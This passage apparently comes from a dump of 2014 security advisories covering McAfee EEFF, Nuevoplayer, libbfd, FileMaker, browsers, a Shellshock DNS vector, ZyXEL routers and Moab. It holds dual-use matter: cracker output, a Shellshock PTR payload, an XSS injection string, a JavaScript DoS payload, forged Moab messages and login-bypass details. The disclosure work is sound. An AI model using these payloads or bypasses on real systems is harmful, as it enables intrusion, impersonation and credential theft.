</td></tr><tr><td><strong> Default Gateway </strong></td><td>
</td><td> </td></tr><tr><td><strong> Maintenance IP Address
</strong></td><td> 192.168.212.231 </td><td>
</td></tr><tr><td><strong> New network parameters will be used
</strong></td><td> immediately
</td><td></td></tr></table><br></body></html>
Workaround / Fix:
-----------------
no patch is available
Timeline:
---------
Vendor Notified: 2014-09-15
Vendor Response: 2014-10-24
Vendor Status: Wont fix
References:
-----------
[1]:
http://industrial.softing.com/de/produkte/profibus-master-or-slave-configura
ble-single-channel-remote-interface.html
[2]: http://www.csnc.de"
5940,[SYSS-2014-008] McAfee File and Removable Media Protection (FRP/EEFF/EERM) - Use of a One-Way Hash with a Predictable Salt (CVE-2014-8565),,CVE-2014-8565,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Advisory ID: SYSS-2014-008
Product(s): McAfee Endpoint Encryption for Files and Folders (EEFF)
McAfee File and Removable Media Protection (FRP)
Vendor: McAfee, Inc.
Affected Version(s): EEFF 3.2.x, 4.0.x, 4.1.x, 4.2.x; FRP 4.3.0.x
Tested Version(s): 4.2.0.164
Vulnerability Type: Insufficient Entropy (CWE-331)
Use of a One-Way Hash with a Predictable Salt (CWE-760)
Risk Level: Medium
Solution Status: Vendor hotfix available
Vendor Notification: 2014-08-11
Solution Date: 2014-10-27
Public Disclosure: 2014-10-31
CVE Reference: CVE-2014-8565
Author of Advisory: Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
The software encryption tool McAfee Endpoint Encryption for Removable Media
(EERM) which is part of the data protection software McAfee Endpoint Encryption
for Files and Folders (EEFF) uses a static and thus predictable salt for
generating password hashes using the password-based key derivation function 2
(PBKDF2).
Due to the use of a predictable, hard-coded salt, it is possible for an attacker
to precompute password candidates and thus to perform more efficient dictionary
attacks against the password-based authentication with the use of rainbow tables
(time-memory trade-off).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
For generating password hashes used by the password-based authentication of the
software encryption tool McAfee Endpoint Encryption for Removable Media (EERM),
the password-based key derivation function 2 (PBKDF2) is used with the following
parameters:
Hash Function : HMAC-SHA1
Master Password: Password (UTF-16)
Salt : hard-coded value from the executable file MfeEERM.exe
711B7D294C7C0FCD3B9B083E13032F91606A4F05D015CCB0BA961C3240B5484A
Iteration : 8193
Output Length : 32 Bytes
The use of a static, hard-coded salt poses a low security risk, as this allows
for more efficient password-guessing attacks making use of a time-memory
trade-off using special precomputed dictionaries with possible password
candidates, for example so-called rainbow tables.
Thereby, the performance of password guessing attacks can be improved by several
orders of magnitude.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The SySS GmbH developed a proof-of-concept software tool for performing
password guessing attacks against removable media protected with McAfee EEFF/RM
using rainbow tables.
The following output exemplarily shows a successful password recovery:
$ ./mcafee_eeff_crack_rainbow -r rainbow_table.rt usb_test1.bin
_____________________________________________________________
/ _____ _____ _____
/ / ___| / ___/ ___|
| `--. _ _ `--. `--. |
| `--. | | |`--. `--. |
| /\__/ / |_| /\__/ /\__/ / |
\____/ \__, \____/\____/ ... uses brute force! /
__/ | /
/ |___/ __________________________________________/
/ _________________/
(__) /_/
(oo)
/------/
/ |____||
* || ||
^^ ^^
McAfee Endproint Encryption for Files and Folders Password Cracker v1.1 (Rainbow Edition)
by Matthias Deeg <matthias.deeg syss de> (c) SySS GmbH 2014
[*] Loaded rainbow table file: 'rainbow_table.rt'
[*] Starting bruteforce attack ...
[*] Attack statistics:
total attack time : 27.152 s
tested passwords : 50000000
avg. performance : 1841484 passwords/s
[+] Password found: passw0rd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Apply the vendor supplied a hotfix for Endpoint Encryption for Files and Folders
(EEFF) or File and Removable Media Protection (FRP) (see [3] and [4]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2014-08-11: Vulnerability reported to vendor
2014-08-11: Vendor acknowledges e-mail with SySS security advisory
2014-08-13: Vendor reviewed the security advisory and assessed the described
finding as a product vulnerability.
As agreed upon with the vendor, the publication date is rescheduled
to October 31, 2014.
2014-10-27: Vendor releases hotfix
2014-10-31: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product Web Site for McAfee Complete Data Protection
http://www.mcafee.com/us/products/complete-data-protection.aspx
[2] PKCS #5: Password-Based Cryptography Specification Version 2.0,
http://tools.ietf.org/html/rfc2898
[3] McAfee Security Bulletin - File and Removable Media Protection
(FRP/EEFF/EERM) update addresses a brute-force attack on weak user passwords
https://kc.mcafee.com/corporate/index?page=content&id=SB10089
[4] Security Enhancement for Endpoint Encryption for Files and Folders and File
and Removable Media Protection
https://kc.mcafee.com/corporate/index?page=content&id=KB83095
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
Security vulnerability found by Matthias Deeg of the SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = 5AE3 96EE A014 FB90 9D81 AF90 8C54 7E88 A34C CED8
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is"" and
without warranty of any kind. Details of this security advisory may be updated
in order to provide as accurate information as possible. The latest version of
this security advisory is available on the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iEYEAREKAAYFAlRTOxcACgkQjFR+iKNMztgnxQCeKZRuNSJKB51YROWopOsJw/AM
JgsAnRlNuO8T7sx9uCKV1dixyRKeBnmX
=D3fz
-----END PGP SIGNATURE-----"
5947,CVE-2014-8399 SQL Injection in NuevoLabs flash player for clipshare,,CVE-2014-8399,"Nuevolabs Nuevoplayer for clipshare SQL Injection
=======================================================================
:: ADVISORY SUMMARY ::
Title: Nuevolabs Nuevoplayer for clipshare Sql Injection
Vendor: NUEVOLABS (www.nuevolabs.com)
Product: NUEVOPLAYER for clipshare
Credits: Cory Marsh - protectlogic.com
Discovery: 2014-10-10
Release: 2014-10-28
Nueovplayer is a popular flash video player with integration into multiple popular video sharing suites. The most notable is Clipshare (clip-share.com). Nuevoplayer provides flash video playing capabilities to third party video sharing suites.
:: VULNERABILITY ::
Type: SQL Injection and Privilege Escalation
Category: Remote
Severity: High
CVSS2: 7.7
CVSS2: (AV:N/AC:L/Au:N/C:P/I:P/A:C/E:F/RL:TF/RC:C)
CVE-ID: CVE-2014-8339
:: AFFECTED PRODUCT VERSIONS ::
NUEVOLABS NUEVOPLAYER for clipshare version 8.0 and possibly earlier.
nuevolabs.com
clip-share.com
:: VULNERABILITY DETAILS ::
A sql injection vulnerability in nuevo player midroll feature with integration for clipshare allows remote attackers to read any information in the effected mysql database. Midrolls allow sites to insert ads or ""midrolls"" into videos during playback.
Because clipshare stores the administrator password in the database this leads to full comprise of the effected clipshare system.
:: SOLUTION ::
Vendor is not providing patches for effected customers.
If the site does NOT use midrolls, you can simply delete midroll.php to protect yourself. If you wish to patch the issue, you can apply this patch to midroll.php which wraps the $ch variable in a intval() function on line 29 of midroll.php:
line 29: 'channel = '.$ch.
becomes: 'channel = '.intval($ch).
------------------- CUT HERE -------------------
--- midroll.php 2014-10-16 21:02:36.077663202 -0600
+++ midroll-patched.php 2014-10-16 21:02:02.197662566 -0600
@@ -26,7 +26,7 @@
$chans = explode(""|"",$channel);
foreach($chans as $ch) {
- if(!$ch=='0') { $add.='channel = '.$ch.' OR '; }
+ if(!$ch=='0') { $add.='channel = '.intval($ch).' OR '; }
}
$add =trim($add); $add=trim($add,'OR');$add=trim($add);
------------------- CUT HERE -------------------
To apply the patch, copy paste this to a new file (midroll.patch for example), upload this file to your server and apply the patch with the command: patch /path/to/midroll.php < /path/to/midroll.patch
eg:
$ cp midroll.php /var/www/site/nuevo/midroll.patch
$ cd /var/www/site/nuevo
$ patch midroll.php < midroll.patch
:: DISCLOSURE ::
2014-10-15 initial vendor contact - no response
2014-10-21 CVE requested
2014-10-23 CVE assigned, vendor contact - no response
2014-10-24 posted to vendor forum - no respsone
2014-10-25 fourth vendor contact - no response
2014-10-26 vendor deletes post and suspends account
2014-10-29 public disclosure
:: DISCLAIMER ::
THE INFORMATION PRESENTED HEREIN ARE PROVIDED �AS IS� WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES AND MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR WARRANTIES OF QUALITY OR COMPLETENESS. THE INFORMATION PRESENTED HERE IS A SERVICE TO THE SECURITY COMMUNITY AND THE PRODUCT VENDORS. ANY APPLICATION OR DISTRIBUTION OF THIS INFORMATION CONSTITUTES ACCEPTANCE ACCEPTANCE AS IS, AND AT THE USER'S OWN RISK."
5960,Re: vulnerabilities in libbfd (CVE-2014-beats-me),,CVE-2014-,"On 27 Oct 2014 14:57, Maciej W. Rozycki wrote:
> On Sun, 26 Oct 2014, Michal Zalewski wrote:
> > Many shell users, and certainly a lot of the people working in
> > computer forensics or other fields of information security, have a
> > habit of running /usr/bin/strings on binary files originating from the
> > Internet. Their understanding is that the tool simply scans the file
> > for runs of printable characters and dumps them to stdout - something
> > that is very unlikely to put you at any risk.
> >
> > It is much less known that the Linux version of strings is an integral
> > part of GNU binutils, a suite of tools that specializes in the
> > manipulation of several dozen executable formats using a bundled
> > library called libbfd. Other well-known utilities in that suite
> > include objdump and readelf.
> >
> > Perhaps simply by the virtue of being a part of that bundle, the
> > strings utility tries to leverage the common libbfd infrastructure to
> > detect supported executable formats and ""optimize"" the process by
> > extracting text only from specific sections of the file.
> > Unfortunately, the underlying library can be hardly described as safe:
> > a quick pass with afl [1] (and probably with any other competent
> > fuzzer) quickly reveals a range of troubling and likely exploitable
> > out-of-bounds crashes due to very limited range checking. In binutils
> > 2.24, you can try:
> >
> > $ wget http://lcamtuf.coredump.cx/strings-bfd-badptr2
> > ...
> > $ strings strings-bfd-badptr2
> > Segmentation fault
> > ...
> > strings[24479]: segfault at 4141416d ip 0807a4e7 sp bf80ca60 error 4
> > in strings[8048000+9a000]
> > ...
> > while (--n_elt != 0)
> > if ((++idx)->shdr->bfd_section)
> > elf_sec_group (idx->shdr->bfd_section) = shdr->bfd_section;
> > ...
> > (gdb) p idx->shdr
> > $1 = (Elf_Internal_Shdr *) 0x41414141
> >
> > In other words, this code appears to first read and then write to an
> > arbitrary pointer (0x41414141) taken from the input file. Many Linux
> > distributions ship strings without ASLR, making potential attacks
> > easier and more reliable - a situation reminiscent of one of
> > CVE-2014-6277 in bash [2].
> >
> > Interestingly, the problems with the utility aren't exactly new; Tavis
> > spotted the first signs of trouble in other parts of libbfd some nine
> > years ago [3].
> >
> > In any case: the bottom line is that if you are used to running
> > strings on random files, or depend on any libbfd-based tools for
> > forensic purposes, you should probably change your habits. For strings
> > specifically, invoking it with the -a parameter seems to inhibit the
> > use of libbfd. Distro vendors may want to consider making the -a mode
> > default, too.
> >
> > [1] Obligatory plug: http://code.google.com/p/american-fuzzy-lop/
> > [2] http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html
> > [3] https://bugs.gentoo.org/show_bug.cgi?id=91398
>
> Has this issue been reported to binutils maintainers?
a few have been reported recently, but not sure if this is the same one. best
to file a bug on sourceware.org/bugzilla/ and as people walk through the
reports, collapse as needed.
> I agree sanitising pointers calculated based on data taken from
> untrusted sources, including broken or deliberately corrupted
> executables, is a must.
sure, but honestly, invoking bfd in any sort of security sensitive context is a
terrible terrible idea. it's full of range issues like this (by nature of its
job), and will continue to be so. unless we switch to a language like python
where exceeding memory ranges is guaranteed to not access invalid memory (not
that i'm suggesting that).
-mike"
5972,[CVE-2014-8347] Filemaker Login Bypass and Privilege Escalation,,CVE-2014-8347,"Filemaker Login Bypass and Privilege Escalation
=======================================================================
[ADVISORY INFORMATION]
Title: Filemaker Login Bypass and Privilege Escalation
Discovery date: 19/10/2014
Release date: 19/10/2014
Vendor Homepage: www.filemaker.com
Version: Filemaker Pro 13.0v3 - FileMaker Pro Advanced 12.0v4
Credits: Giuseppe D'Amore (http://it.linkedin.com/pub/giuseppe-d-amore/69/37/66b)
[VULNERABILITY INFORMATION]
Class: Authentication Bypass and Privilege Escalation
Category: Desktop Application
Severity: High
CVSS v2 Vector: 7.2 AV:L/AC:L/Au:N/C:C/I:C/A:C
CVE-ID: CVE-2014-8347
[AFFECTED PRODUCTS]
This security vulnerability affects:
* FileMaker Pro 13.0v3 - FileMaker Pro Advanced 12.0v4
[VULNERABILITY DETAILS]
There is a obvious vulnerability of FileMaker that allow access to the local FM-based database file:
On DBEngine dll, there is a function called MatchPasswordData:
...
...
...
5BB8D53A C68424 74020000 >MOV BYTE PTR SS:[ESP+274],0
5BB8D542 FF15 D437D25B CALL DWORD PTR DS:[<&Support.??1PasswordHash@Draco@@QAE@XZ>] <-- Compute the password's hash.
5BB8D548 8B8C24 6C020000 MOV ECX,DWORD PTR SS:[ESP+26C]
5BB8D54F 5F POP EDI
5BB8D550 5E POP ESI
5BB8D551 8AC3 MOV AL,BL <-- if AL is 0 then you are not authenticated else if AL is 1 you are authenticated,
so simply by changing a single bit you are able to bypass the login,
also if your username is Admin, you can obtain a privilege escalation and full permissions on DB.
5BB8D553 64:890D 00000000 MOV DWORD PTR FS:[0],ECX
5BB8D55A 5B POP EBX
5BB8D55B 8BE5 MOV ESP,EBP
5BB8D55D 5D POP EBP
5BB8D55E C2 0400 RETN 4
...
...
...
it doesn't matter if your desktop or mobile application is developed in a ""secure manner"", your confidential data on the database can be accessed.
[DISCLOSURE TIME-LINE]
* 19/10/2014 - Public disclosure and simultaneously initial vendor contact.
[DISCLAIMER]
The author is not responsible for the misuse of the information provided in
this security advisory. The advisory is a service to the professional security
community. There are NO WARRANTIES with regard to this information. Any
application or distribution of this information constitutes acceptance AS IS,
at the user's own risk. This information is subject to change without notice."
6058,two browser mem disclosure bugs (CVE-2014-1580 and CVE-something-or-other),,CVE-2014-1580,"First of all, CVE-2014-1580 (MSFA 2014-78) is a bug that caused
Firefox prior to version 33 (released today) to leak bits of
uninitialized memory when rendering certain types of truncated images
onto <canvas>.
Mozilla's advisory is here:
https://www.mozilla.org/security/announce/2014/mfsa2014-78.html
Bug is here:
https://bugzilla.mozilla.org/show_bug.cgi?id=1063733
PoC is here:
http://lcamtuf.coredump.cx/ffgif2/
Secondly, MSRC case #19611cz is a seemingly similar issue with
Internet Explorer apparently using bits of uninitialized stack data
when handling JPEG files with an oddball DHT. You should be able to
reproduce with:
http://lcamtuf.coredump.cx/iepuzzle/canvas.html
This one doesn't have a fix yet; I decided to disclose it because it
is easily hit with an existing open-source fuzzer, and because
we went past the 90-day mark without making any evident progress on
the report. The timeline is captured here:
http://lcamtuf.blogspot.com/2014/10/two-more-browser-memory-disclosure-bugs.html
Obligatory plug - both of these have been found with:
http://code.google.com/p/american-fuzzy-lop/"
6069,CVE-2014-3671: DNS Reverse Lookup as a vector for the Bash vulnerability (CVE-2014-6271 et.al.),,CVE-2014-3671,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Security Advisory
DNS Reverse Lookup as a vector for the Bash vulnerability (CVE-2014-6271 et.al.)
CVE-2014-3671
references:
CVE-2014-6271, CVE-2014-7169, CVE-2014-6277, CVE-2014-6278
CVE-2014-7186 and, CVE-2014-7187
* Summary:
Above CVEs detail a number of flaws in bash prior related to the parsing
of environment variables (aka BashBug, Shellshock). Several networked
vectors for triggering this bug have been discovered; such as through
dhcp options and CGI environment variables in webservers [1].
This document is to advise you of an additional vector; through a
reverse lookup in DNS; and where the results of this lookup are
passed, unsanitized, to an environment variable (e.g. as part of
a batch process).
This vector is subtly different from a normal attack vector, as the
attacker can 'sit back' and let a (legitimate) user trigger the
issue; hence keeping the footprint for a IDS or WAAS to act on small.
* Resolvers/systems affected:
At this point of time the stock resolvers (in combination with the libc
library) of OSX 10.9 (all versions) and 10.10/R2 are the only known
standard installations that pass the bash exploit string back and
up to getnameinfo().
That means that UNpatched systems are vulnerable through this vector
PRIOR to the bash update documented in http://support.apple.com/kb/DL1769.
Most other OS-es (e.g. RHEL6, Centos, FreeBSD 7 and up, seem
unaffected in their stock install as libc/libresolver and DNS use
different escaping mechanisms (octal v.s. decimal).
We're currently following investing a number of async DNS resolvers
that are commonly used in DB cache/speed optimising products and
application level/embedded firewall systems.
Versions affected:
See above CVEs as your primary source.
* Resolution and Mitigation:
In addition to the mitigations listed in above CVEs - IDSes and similar
systems may be configured to parse DNS traffic in order to spot the
offending strings.
Also note that Apple DL1769 addresses the Bash issue; NOT the vector
through the resolver.
* Reproducing the flaw:
A simple zone file; such as:
$TTL 10;
$ORIGIN in-addr.arpa.
@ IN SOA ns.boem.wleiden.net dirkx.webweaving.org (
666 ; serial
360 180 3600 1800 ; very short lifespan.
)
IN NS 127.0.0.1
* PTR ""() { :;}; echo CVE-2014-6271, CVE-201407169, RDNS""
can be used to create an environment in which to test the issue with existing code
or with the following trivial example:
#include <sys/socket.h>
#include <netdb.h>
#include <assert.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
int main(int argc, char ** argv) {
struct in_addr addr;
struct sockaddr_in sa;
char host[1024];
assert(argc==2);
assert(inet_aton(argv[1],&addr) == 1);
sa.sin_family = AF_INET;
sa.sin_addr = addr;
assert(0==getnameinfo((struct sockaddr *)&sa, sizeof sa,
host, sizeof host, NULL, 0, NI_NAMEREQD));
printf(""Lookup result: %s "", host);
assert(setenv(""REMOTE_HOST"",host,1) == 0);
execl(""/bin/bash"",NULL);
}
Credits and timeline
The flaw was found and reported by Stephane Chazelas (see CVE-2014-6271
for details). Dirk-Willem van Gulik (dirkx(at)webweaving.org) found
the DNS reverse lookup vector.
09-04-2011 first reported.
2011, 2014 issue verified on various embedded/firewall/waas
systems and reported to vendors.
??-09-2014 Apple specific exploited seen.
11-10-2014 Apple confirms that with DL1769 in place that
""The issue that remains, while it raises
interesting questions, is not a security
issue in and of itself.""
* Common Vulnerability Scoring (Version 2) and vector:
See CVE-2014-6271.
1:https://github.com/mubix/shellshocker-pocs/blob/master/README.md)
1.10 / : 1726 $
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.22 (Darwin)
Comment: This message is encrypted and/or signed with PGP (gnu-pg, gpg). Contact dirkx webweaving org if you cannot read it.
iQCVAwUBVDujjDGmPZbsFAuBAQKGqwP+OOzdL8PDZF7Ckpk1UCxZZoWYvvGUHBqs
dE8ioLaQsRDKJ+V2EbBGHmSucYLPqBVfRYaYar21KCl6DAcxzQmxhymxxpRjBPsP
uauqW7dYZQASDkKG9Rn0KA4dXNo9GjrJMrTcwkfkoNb5EtVtiMDX8VXoZ4SqLJS0
v5s8ZtQiIw4=
=I6vK
-----END PGP SIGNATURE-----"
6110,CVE-2014-7277 Stored Server XSS in ZyXEL SBG-3300 Security Gateway,,CVE-2014-7277,"########################################
#Vulnerability Title: Stored Server XSS in ZyXEL SBG-3300 Security Gateway
#Date: 02/10/2014
#CVE-ID: CVE-2014-7277
#Product: ZyXEL SBG3300-N series
#Vendor: www.zyxel.com
#Affected Firmware: Latest version at the time of disclosure V1.00(AADY.4)C0 and below (tested)
#Patch: Unpatched
#Authored by: Mirko Casadei
########################################
#Disclosure Timeline:
13/08/2014 Vendor Contact with Acknowledgment
13/09/2014 No response from Vendor after first contact
02/10/2014 Full Disclosure
#Technical details:
The web interface of the Security Gateway is affected by a Stored Server XSS vulnerability in the main login page.
Abusing the login 'welcome message' form, an attacker can inject the XSS in HTML code.
Example of a working code:
..
<span class=""title_index"">Welcome</span><br>
<li id=""loginMessage""><img src=x onerror=alert('XSS') /></li>
..
#Remediation
The vulnerable form should sanitize input.
########################################"
6111,CVE-2014-7278 DoS in ZyXEL SBG-3300 Security Gateway,,CVE-2014-7278,"########################################
#Vulnerability Title: DoS in ZyXEL SBG-3300 Security Gateway
#Date: 02/10/2014
#CVE-ID: CVE-2014-7278
#Product: ZyXEL SBG3300-N series
#Vendor: www.zyxel.com
#Affected Firmware: Latest version at the time of disclosure V1.00(AADY.4)C0 and below (tested)
#Patch: Unpatched
#Authored by: Mirko Casadei
########################################
#Disclosure Timeline:
13/08/2014 Vendor Contact with Acknowledgment
13/09/2014 No response from Vendor after first contact
02/10/2014 Full Disclosure
#Technical details:
Abusing the 'welcome message' form, an attacker can inject JavaScript code into a core function of the main login page.
The persistent javascript code injection in the framLoad() function bypass all the security checks and cause a Denial of Service disabling any access to the router web interface.
Access is restored with a new firmware installation.
Example of a working code:
//////// !WARNING! TEST AT YOUR OWN RISK ///////
var loginMsg loads input from the 'welcome message form'
..
function framLoad () {
var status = '0';
var count = '';
var Retry = '';
var period = '';
var loginMsg = '<DoS=""javascript:alert('DoS coming!')"">';
var LockTime;
var waitTime;
if ( advancedaccountsecurity == '0' ) {
loginrandom = '0';
}
..
#Remediation
The vulnerable form should sanitize input.
########################################"
6135,Moab Authentication Bypass (insecure message signing) [CVE-2014-5376],,CVE-2014-5376,"##[Moab Authentication Bypass (insecure message signing) : CVE-2014-5376]##
Software: Moab
Affected Versions: Dependent on configuration, can affect all versions of Moab including Moab 8
CVE Reference: CVE-2014-5376
Author: John Fitzpatrick, Luke Jennings MWR Labs (http://labs.mwrinfosecurity.com/)
Severity: High Risk
Vendor: Adaptive Computing
Vendor Response: Provided additional guidance in 7.2.9 release notes (MOAB-7480)
##[Description]
Moab provides two methods to authenticate messages sent by users (e.g. job submissions). The default scheme which is widely used is insecure and can be circumvented in order to impersonate other users and perform operations on their behalf.
##[Impact]
It is possible to exploit this issue remotely in order to perform any operation on the server from the perspective of any user role. Examples include submitting jobs as arbitrary users (including as root), as well as reconfiguring the Moab server itself.
##[Cause]
The default authentication mechanism does not perform sufficient validation that the user requesting the signing of a message is the owner of the message.
##[Solution]
Make use of moab.key files with a complex key value.
Adaptive acknowledge this issue in the 7.2.9 release notes (MOAB-7480) as a known issue, stating:
""When installing or upgrading, it is strongly recommended that administrators configure Moab with mauth authentication with a complex key value. See Mauth Authentication (http://docs.adaptivecomputing.com/mwm/7-2-9/help.htm#a.esecurity.html%23mauth) for more information.""
##[Technical Details]
Moab is a workload manager used in High Performance Computing (HPC) environments. In a typical environment a user submits their jobs to the Moab server for it to handle the workload. Moab communication makes use of an XML based protocol and these messages are signed with a key. An example message is shown below:
<Envelope component=""ClusterScheduler"" count=""1"" name=""moab"" type=""nonblocking"" version=""8.0.beta.2"">
<Signature>
<DigestValue>7v49VzAlbyNQ4O3VChCus+v2LeE=</DigestValue>
<SignatureValue>QG13cmxhYnMgRWFzdGVyIEVnZyE=</SignatureValue>
</Signature>
<Body actor=""test"" timestamp=""1408488412"">
<Request action=""submit"" actor=""test"" cmdline=""STARTmsub"">
<Object>job</Object>
<job>
<Owner>test</Owner>
<UserId>test</UserId>
<GroupId>test</GroupId>
<InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
<UMask>2</UMask>
<Executable>/usr/bin/id</Executable>
<SubmitLanguage>PBS</SubmitLanguage>
<SubmitString>START/usr/bin/idaa</SubmitString>
</job>
</Request>
</Body>
</Envelope>
On receiving a message the server will generate a signature and ensure that it matches the <SignatureValue> element within the message. This signature is effectively computed in the following manner:
signature = f(messageBody,key)
Therefore in order to communicate with the Moab server users must be able to compute valid signatures and two mechanisms are provided within Moab for achieving this:
1. The use of .moab.key files (more secure)
2. Use of a pre-generated key (insecure) - default
Where .moab.key files are used a SUID root binary (mauth) provides an interface to this key as well as a means for verifying that the user calling mauth matches the actor specified within the XML message being signed.
Where a pre-generated key is used mauth is not called and the generation of messages is performed entirely within the context of the calling user. There is no validation that the user requesting the signing of the message is the actor specified within the message. As a result where pre-generated keys are used it is possible to craft messages belonging to other users and to perform operations and submit jobs as other users. Simply patching the return value of calls to getuid() is sufficient to impersonate other users.
##[Detailed Timeline]
2014-01-21 : Detailed vulnerability information provided to Adaptive
2014-08-27 : Full advisory provided to Adaptive
2014-09-08 : Release of advisory to HPC community
2014-09-25 : Public release of advisory
http://labs.mwrinfosecurity.com"
6136,Moab User Impersonation [CVE-2014-5375],,CVE-2014-5375,"##[Moab User Impersonation : CVE-2014-5375]##
Software: Moab
Affected Versions: All current versions of Moab. However, the impact is limited in Moab 7.2.9 and Moab 8.
CVE Reference: CVE-2014-5375
Author: John Fitzpatrick, Luke Jennings MWR Labs (http://labs.mwrinfosecurity.com/)
Severity: High Risk
Vendor: Adaptive Computing
Vendor Response: Updates in Moab 7.2.9 and Moab 8 provide some mitigations
##[Description]
It is possible to submit jobs to Moab as arbitrary users due to insufficient authentication checks during the submission of a job to the Moab server.
##[Impact]
Users are able to submit jobs as arbitrary users. In environments that permit it this could allow job execution as root.
##[Cause]
Moab does not sufficiently validate the job submissions against its intended user ID values.
##[Solution]
An upgrade to Moab 7.2.9 or Moab 8 prevents direct exploitation of this issue (further details are provided in the &#147;Technical Details&#148; section below). In these versions jobs submitted in this manner enter a held state, this is flagged as a known issue by Adaptive (MOAB-7478):
""Jobs submitted with invalid credentials are put in a held state, instead of rejected, until the administrator can respond. The checkjob command gives administrators further information regarding why the job is held. Blindly assuming that all held jobs should in fact be running RIGHT NOW is not only unsafe, but circumvents intentional Moab policies and workflow. An administrator should exercise care when resolving held jobs"".
Administrators should be aware that attackers can control the <UserID> value which provides them control over the user specified within the checkjob. MWR would recommend that Adaptive make use of the &#147;actor&#148; value passed to Moab, as the controls introduced in 7.2.9 and 8 prevent manipulation of this value.
##[Technical Details]
Moab is a workload manager used in High Performance Computing (HPC) environments. In a typical environment a user submits their jobs to the Moab server for it to handle the workload. Moab communication makes use of an XML based protocol. An example message showing a job submission is shown below:
<Envelope component=""ClusterScheduler"" count=""1"" name=""moab"" type=""nonblocking"" version=""8.0.beta.2"">
<Signature>
<DigestValue>7v49VzAlbyNQ4O3VChCus+v2LeE=</DigestValue>
<SignatureValue>QG13cmxhYnMgRWFzdGVyIEVnZyE=</SignatureValue>
</Signature>
<Body actor=""test"" timestamp=""1408488412"">
<Request action=""submit"" actor=""test"" cmdline=""STARTmsub"">
<Object>job</Object>
<job>
<Owner>test</Owner>
<UserId>test</UserId>
<GroupId>test</GroupId>
<InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
<UMask>2</UMask>
<Executable>/usr/bin/id</Executable>
<SubmitLanguage>PBS</SubmitLanguage>
<SubmitString>START/usr/bin/idaa</SubmitString>
</job>
</Request>
</Body>
</Envelope>
Within this message users are specified in multiple locations, these are highlighted in bold in the message above. In versions of moab prior to Moab 8 there are two instances of the ""actor"" value specified. In order for mauth to sign a message the actor specified within the <Request> tag must match the user calling mauth. It is not necessary for the actor value within the <Body> tag to match the calling user.
In addition to checks at the mauth level the server will perform its own checks. The server ensures that the <Owner> matches the user specified within the <Body> actor value. If either differs an error (code 999 &#150; invalid credentials specified for submitted job) is returned by the server and the job rejected.
Since the actor value within the body tag is not verified by mauth, and this actor value is also the one against which the server checks the <Owner> tag, it is possible to smuggle through jobs to the server with an arbitrary user specified in each of these values. The user under which the job is queued by Moab is the user specified within the <UserId> tag. Whilst it is possible to impersonate a user by changing only this value, doing so appears to impede communication between Moab and a workload manager, on TORQUE this results in the job entering a BatchHold state where it will not execute. When the Body.actor value, the <Owner> and the <UserId> value are altered (but the Request.actor value remains legitimate to facilitate signing) it is possible to impersonate any user.
The example above describes this process when impersonating users during job submission. Moab also provides a means to reconfigure the server and a similar approach can be adopted to impersonate root and perform server reconfiguration.
In Moab 8 only a single actor value is contained within the messages and is used by both mauth and by the Moab server. This prevents manipulation of the <Owner> value during job submission. It remains possible to alter the <UserId> value and submit jobs in Moab 8 (as described above), although in a typical Moab+TORQUE configuration this does cause the job to enter a BatchHold state (other resource managers have not been tested).
Whilst components of this issue remain outstanding, upgrading to 7.2.9 or Moab 8 appears to mitigate direct exploitation of the issue.
##[Detailed Timeline]
2014-01-21 : Detailed vulnerability information provided to Adaptive
2014-09-01 : Full advisory provided to Adaptive
2014-09-08 : Release of advisory to HPC community
2014-09-25 : Public release of advisory
http://labs.mwrinfosecurity.com"
6137,Moab Authentication Bypass [CVE-2014-5300],,CVE-2014-5300,"##[Moab Authentication Bypass : CVE-2014-5300]##
Software: Moab
Affected Versions: All versions prior to Moab 7.2.9 and Moab 8
CVE Reference: CVE-2014-5300
Author: John Fitzpatrick, MWR Labs (http://labs.mwrinfosecurity.com/)
Severity: High Risk
